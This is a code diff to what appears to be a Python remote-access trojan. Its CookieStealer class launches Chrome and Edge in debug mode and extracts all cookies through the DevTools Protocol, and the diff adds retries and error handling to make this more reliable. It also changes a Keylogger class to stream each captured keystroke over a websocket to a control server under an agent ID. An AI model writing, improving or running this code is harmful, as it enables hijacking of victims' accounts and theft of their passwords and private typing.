@@ -194,21 +194,20 @@ class CookieStealer:
         """Main method to steal cookies from all browsers"""
         results = []
         
-        # Chrome
+        # Chrome and Edge - use port 9223 for both
         chrome_data = self._process_browser_cookies(
             'chrome',
             self.CHROME_PATH,
-            self.chrome_debug_port,
+            9223,
             self.CHROME_USER_DATA_DIR
         )
         if chrome_data:
             results.append(chrome_data)
         
-        # Edge
         edge_data = self._process_browser_cookies(
             'edge',
             self.EDGE_PATH,
-            self.edge_debug_port,
+            9223,
             self.EDGE_USER_DATA_DIR
         )
         if edge_data:
@@ -223,19 +222,34 @@ class CookieStealer:
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
         """Process Chrome/Edge cookies"""
+        import time
         try:
             self._log('info', f"Processing {browser_name} cookies")
             
             # Start browser in debug mode
             proc = self._start_browser_debug(browser_path, port, user_data_dir)
             if not proc:
+                self._log('error', f"Failed to start {browser_name} browser process")
                 return None
 
-            # Wait for browser to start
-            time.sleep(5)
-            
-            # Get cookies via debug protocol
-            cookies = self._get_cookies_via_debug(port)
+            # Wait for browser to start with retries
+            max_retries = 5
+            for attempt in range(max_retries):
+                if proc.poll() is not None:
+                    self._log('error', f"{browser_name} browser process exited prematurely with code {proc.returncode}")
+                    return None
+                try:
+                    cookies = self._get_cookies_via_debug(port)
+                    if cookies:
+                        break
+                except Exception as e:
+                    self._log('error', f"Attempt {attempt+1} failed to get cookies: {str(e)}")
+                time.sleep(2)
+            else:
+                self._log('error', f"Failed to connect to {browser_name} debug port after {max_retries} attempts")
+                proc.terminate()
+                proc.wait()
+                return None
             
             # Clean up browser process
             proc.terminate()
@@ -351,16 +365,20 @@ class CookieStealer:
 
     def _get_cookies_via_debug(self, port):
         """Get cookies using Chrome DevTools Protocol"""
+        import traceback
         try:
             debug_url = f'http://localhost:{port}/json'
+            self._log('info', f"Attempting to connect to debug URL: {debug_url}")
             response = requests.get(debug_url, timeout=self.timeout)
             response.raise_for_status()
             
             data = response.json()
             if not data:
+                self._log('error', "No data received from debug URL")
                 return []
                 
             ws_url = data[0]['webSocketDebuggerUrl']
+            self._log('info', f"Connecting to WebSocket URL: {ws_url}")
             ws = websocket.create_connection(ws_url, timeout=self.timeout)
             
             ws.send(json.dumps({
@@ -372,10 +390,14 @@ class CookieStealer:
             return response['result']['cookies']
         except Exception as e:
             self._log('error', f"Debug protocol error: {str(e)}")
+            self._log('error', traceback.format_exc())
             return []
         finally:
             if 'ws' in locals():
-                ws.close()
+                try:
+                    ws.close()
+                except Exception as e:
+                    self._log('error', f"Error closing websocket: {str(e)}")
 
     def _find_firefox_profile(self):
         """Find Firefox profile directory"""
@@ -1039,10 +1061,12 @@ class SOCKS5Proxy:
 # Keylogger
 # ======================
 class Keylogger:
-    def __init__(self):
+    def __init__(self, ws_client=None, agent_id=None):
         self.log = ""
         self.listener = None
         self.running = False
+        self.ws_client = ws_client
+        self.agent_id = agent_id
 
     def start(self):
         if self.running:
@@ -1069,14 +1093,25 @@ class Keylogger:
 
     def _on_key_press(self, key):
         try:
-            self.log += str(key.char)
+            char = str(key.char)
         except AttributeError:
             if key == key.space:
-                self.log += " "
+                char = " "
             elif key == key.enter:
-                self.log += "\n"
+                char = "\n"
             else:
-                self.log += f"[{key}]"
+                char = f"[{key}]"
+        self.log += char
+        # Send keypress over websocket if connected
+        if self.ws_client and self.ws_client.connected and self.agent_id:
+            try:
+                self.ws_client.socket.emit('keylogger_data', {
+                    'agent_id': self.agent_id,
+                    'keys': char
+                }, namespace='/terminal')
+            except Exception as e:
+                # Log error but continue
+                self.log += f"[Error sending key: {str(e)}]"
 
 
 # ======================
